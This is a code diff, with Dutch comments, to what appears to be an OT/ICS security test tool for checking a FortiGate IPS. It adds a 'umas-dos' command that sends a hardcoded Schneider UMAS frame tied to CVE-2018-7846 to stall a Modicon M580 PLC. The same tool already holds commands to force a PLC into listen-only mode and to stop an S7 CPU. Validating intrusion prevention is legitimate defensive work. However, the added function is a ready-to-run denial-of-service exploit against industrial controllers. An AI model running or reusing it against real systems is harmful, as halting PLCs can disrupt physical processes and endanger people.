@@ -10,6 +10,7 @@ Elk commando print als laatste regel één JSON-object: {"ok": bool, "detail": .
   modbus-read <ip> <addr> <count>   holding registers lezen
   modbus-write <ip> <addr> <value>  holding register schrijven
   modbus-forcelisten <ip>           Force Listen Only Mode (FC08): PLC stilzetten (DoS)
+  umas-dos <ip>                     Schneider UMAS-DoS (FC 0x5A) tegen een Modicon M580
   s7-read <ip>                      CPU-status + DB1 lezen
   s7-stop <ip> / s7-start <ip>      CPU naar STOP / RUN
   opcua-browse <url>                OPC UA-objecten opvragen
@@ -142,6 +143,40 @@ def cmd_modbus_forcelisten(ip):
         s.close()
 
 
+def cmd_umas_dos(ip):
+    """Schneider UMAS-commando over Modbus (function code 0x5A) richting een
+    Modicon M580. De probe doet eerst een normale read zodat de FortiGate de
+    sessie herkent, en stuurt dan het UMAS-frame dat hoort bij de M580 UMAS-DoS
+    (CVE-2018-7846): een read-only PLC zou dit moeten weigeren, een kwetsbare M580
+    valt erdoor stil. Een FortiGate met de virtual-patch-signature dropt het frame."""
+    read = bytes.fromhex("000100000006010300000001")  # FC03: HR0, 1 register
+    # MBAP(txn,proto,len=5,unit) + FC 0x5A (UMAS) + pairing key 0x00 + UMAS-functie 0x11 + data
+    umas = bytes.fromhex("000100000005005A001100")
+    try:
+        s = socket.create_connection((ip, 502), timeout=5)
+    except OSError as e:
+        out(False, f"{ip}:502 niet bereikbaar - {e}")
+    try:
+        s.sendall(read)
+        s.settimeout(3)
+        try:
+            s.recv(64)
+        except socket.timeout:
+            pass
+        s.sendall(umas)
+        s.settimeout(3)
+        try:
+            data = s.recv(64)
+        except socket.timeout:
+            out(True, f"UMAS-frame afgeleverd bij {ip}:502 (geen antwoord)")
+        out(True, f"UMAS-frame afgeleverd bij {ip}:502"
+                  + (f" (antwoord {data.hex()})" if data else " (sessie gesloten)"))
+    except (ConnectionResetError, BrokenPipeError, OSError) as e:
+        out(False, f"{ip}:502 - sessie gedropt/gereset (IPS?): {e}")
+    finally:
+        s.close()
+
+
 def _s7(ip):
     import snap7
     c = snap7.client.Client()
@@ -197,7 +232,7 @@ def cmd_opcua_browse(url):
 COMMANDS = {
     "scan": cmd_scan, "tcp": cmd_tcp, "http": cmd_http, "shellshock": cmd_shellshock,
     "modbus-read": cmd_modbus_read, "modbus-write": cmd_modbus_write,
-    "modbus-forcelisten": cmd_modbus_forcelisten,
+    "modbus-forcelisten": cmd_modbus_forcelisten, "umas-dos": cmd_umas_dos,
     "s7-read": cmd_s7_read, "s7-stop": cmd_s7_stop, "s7-start": cmd_s7_start,
     "opcua-browse": cmd_opcua_browse,
 }
